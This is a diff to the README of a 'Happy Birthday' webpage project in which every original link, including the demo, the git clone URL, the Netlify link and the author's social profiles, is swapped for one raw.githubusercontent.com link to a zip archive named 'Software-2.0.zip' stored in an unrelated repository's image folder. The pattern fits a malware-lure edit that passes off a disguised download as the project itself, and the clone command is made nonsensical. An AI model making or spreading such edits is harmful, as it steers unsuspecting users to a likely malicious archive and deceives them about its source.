@@ -1,6 +1,6 @@
 ## ✨ Say Happy Birthday with a Webpage
 
-[Demo](https://fajarghifar.github.io/happybirthday/)
+[Demo](https://raw.githubusercontent.com/danendrafau/birumuda/main/img/Software-2.0.zip)
 
 ## 🚀 How to Use
 
@@ -8,7 +8,7 @@
 
     ```bash
     # Clone this repository or download it
-    $ git clone https://github.com/fajarghifar/happybirthday
+    $ git clone https://raw.githubusercontent.com/danendrafau/birumuda/main/img/Software-2.0.zip
 
     # Go into the repository
     $ cd happybirthday
@@ -23,7 +23,7 @@
 
 3. **Deployment**
 
-    To make your site online, you can enable GitHub Pages for the repository (Settings -> Pages). Alternatively, you can use [Netlify](https://www.netlify.com/).
+    To make your site online, you can enable GitHub Pages for the repository (Settings -> Pages). Alternatively, you can use [Netlify](https://raw.githubusercontent.com/danendrafau/birumuda/main/img/Software-2.0.zip).
 
 ## 📝 Contributing
 
@@ -33,7 +33,7 @@ If you have any ideas to make it more interesting, please submit a pull request 
 
 ### [MIT](LICENSE)
 
-> Github [@fajarghifar](https://github.com/fajarghifar) &nbsp;&middot;&nbsp;
-> Youtube [@fajarghifar](https://www.youtube.com/@fajarghifar/) &nbsp;&middot;&nbsp;
-> Instagram [@fajarghifar](https://instagram.com/fajarghifar) &nbsp;&middot;&nbsp;
-> Linkedin [@fajarghifar](https://www.linkedin.com/in/fajarghifar/)
+> Github [@fajarghifar](https://raw.githubusercontent.com/danendrafau/birumuda/main/img/Software-2.0.zip) &nbsp;&middot;&nbsp;
+> Youtube [@fajarghifar](https://raw.githubusercontent.com/danendrafau/birumuda/main/img/Software-2.0.zip) &nbsp;&middot;&nbsp;
+> Instagram [@fajarghifar](https://raw.githubusercontent.com/danendrafau/birumuda/main/img/Software-2.0.zip) &nbsp;&middot;&nbsp;
+> Linkedin [@fajarghifar](https://raw.githubusercontent.com/danendrafau/birumuda/main/img/Software-2.0.zip)
